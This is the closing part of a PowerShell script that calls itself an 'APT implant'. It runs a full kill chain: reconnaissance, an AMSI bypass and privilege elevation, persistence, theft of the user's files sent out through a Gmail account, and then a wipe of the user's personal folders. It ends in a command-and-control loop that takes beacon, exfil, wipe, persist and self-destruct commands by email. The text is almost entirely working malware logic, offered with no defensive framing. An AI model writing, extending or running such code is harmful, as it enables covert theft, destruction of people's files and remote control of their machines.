            $cmds = Invoke-GmailImapCheck -User $From -Pass $AppPassword
            foreach ($cmd in $cmds) {
                $upper = $cmd.ToUpper()
                switch -Regex ($upper) {
                    "^BEACON$" {
                        Send-BeaconEmail -From $From -AppPassword $AppPassword -Extra "manual"
                    }
                    "^EXFIL$" {
                        Invoke-MissionExfil -From $From -AppPassword $AppPassword -Passphrase $Passphrase
                    }
                    "^WIPE$" {
                        $TargetDirs = @(
                            [System.IO.Path]::Combine($env:USERPROFILE, "Desktop"),
                            [System.IO.Path]::Combine($env:USERPROFILE, "Documents"),
                            [System.IO.Path]::Combine($env:USERPROFILE, "Downloads"),
                            [System.IO.Path]::Combine($env:USERPROFILE, "Pictures"),
                            [System.IO.Path]::Combine($env:USERPROFILE, "Music"),
                            [System.IO.Path]::Combine($env:USERPROFILE, "Videos")
                        )
                        $files = @()
                        foreach ($d in $TargetDirs) { $files += Get-FilesRecursive -Path $d -Depth $MaxDepth }
                        Invoke-MissionWipe -FileList $files
                    }
                    "^PERSIST$" {
                        Install-PersistenceLayers
                        Send-BeaconEmail -From $From -AppPassword $AppPassword -Extra "persistence reinstalled"
                    }
                    "^CLEAN$" {
                        Remove-PersistenceLayers
                        Send-BeaconEmail -From $From -AppPassword $AppPassword -Extra "persistence removed"
                    }
                    "^SLEEP:(\d+)$" {
                        $interval = [int]$matches[1]
                        Write-Log ("Beacon interval set to {0} min." -f $interval) -Level Ok
                    }
                    "^SELFDESTRUCT$" {
                        Write-Log "SELF-DESTRUCT received." -Level Warn
                        Remove-PersistenceLayers
                        Remove-Item $InstallPath -Force -ErrorAction SilentlyContinue
                        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
                        Remove-Item $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
                        exit
                    }
                }
            }
        } catch {
            Write-Log ("C2 loop error: {0}" -f $_) -Level Debug
        }
    }
}

# ============================================================
# MAIN - EXECUTE KILL CHAIN
# ============================================================
$script:ConsoleOutput = $ConsoleOutput

try {
    Write-Log "=============================================" -Level Info
    Write-Log " APT IMPLANT - CYBER KILL CHAIN EXECUTION" -Level Info
    Write-Log "=============================================" -Level Info

    # Single instance guard
    $mutex = New-Object System.Threading.Mutex($false, $MutexName)
    if (-not $mutex.WaitOne(0)) {
        Write-Log "Another instance is running. Exiting." -Level Warn
        exit
    }

    Assert-Assemblies

    # ---- PHASE 0: RECONNAISSANCE ----
    Write-Log "PHASE 0/6: RECONNAISSANCE" -Level Info
    $recon = Get-ReconInfo
    foreach ($k in $recon.Keys) {
        Write-Log ("{0}: {1}" -f $k, $recon[$k]) -Level Debug
    }

    # ---- PHASE 3: EXPLOITATION ----
    Write-Log "PHASE 3/6: EXPLOITATION (AMSI bypass, elevation)" -Level Info
    Invoke-AmsiBypass
    if ($SelfElevate) { Invoke-SelfElevate }

    # ---- PHASE 2: DELIVERY (self-drop) ----
    Write-Log "PHASE 2/6: DELIVERY" -Level Info
    $missionRan = Test-Path $StateFile -PathType Leaf

    # ---- PHASE 4: INSTALLATION ----
    Write-Log "PHASE 4/6: INSTALLATION (persistence)" -Level Info
    if ($missionRan) {
        Write-Log "State file present - persistence already installed, verifying..." -Level Debug
    } else {
        Install-PersistenceLayers
        Send-BeaconEmail -From $GmailAddress -AppPassword $GmailAppPassword -Extra "implant installed"
    }

    # ---- PHASE 6: ACTIONS ON OBJECTIVES ----
    if ($AutoMission -and -not $missionRan) {
        Write-Log "PHASE 6/6: ACTIONS ON OBJECTIVES (exfil -> wipe)" -Level Info
        $ok = Invoke-MissionExfil -From $GmailAddress -AppPassword $GmailAppPassword -Passphrase $GmailAppPassword
        if ($ok) {
            Write-Log "Exfiltration confirmed. Executing wipe..." -Level Warn
            $TargetDirs = @(
                [System.IO.Path]::Combine($env:USERPROFILE, "Desktop"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Documents"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Downloads"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Pictures"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Music"),
                [System.IO.Path]::Combine($env:USERPROFILE, "Videos")
            )
            $files = @()
            foreach ($d in $TargetDirs) { $files += Get-FilesRecursive -Path $d -Depth $MaxDepth }
            Invoke-MissionWipe -FileList $files
        } else {
            Write-Log "Exfiltration FAILED - wipe aborted. No files touched." -Level Error
        }
    } else {
        Write-Log "Auto mission skipped (already completed or disabled)." -Level Debug
    }

    # ---- PHASE 5: C2 ----
    if ($EnableC2) {
        Write-Log "PHASE 5/6: COMMAND AND CONTROL" -Level Info
        Invoke-C2Loop -From $GmailAddress -AppPassword $GmailAppPassword -Passphrase $GmailAppPassword
    }

} catch {
    Write-Log ("Unhandled exception: {0}" -f $_) -Level Error
    Write-Log ("Stack: {0}" -f $_.ScriptStackTrace) -Level Debug
}
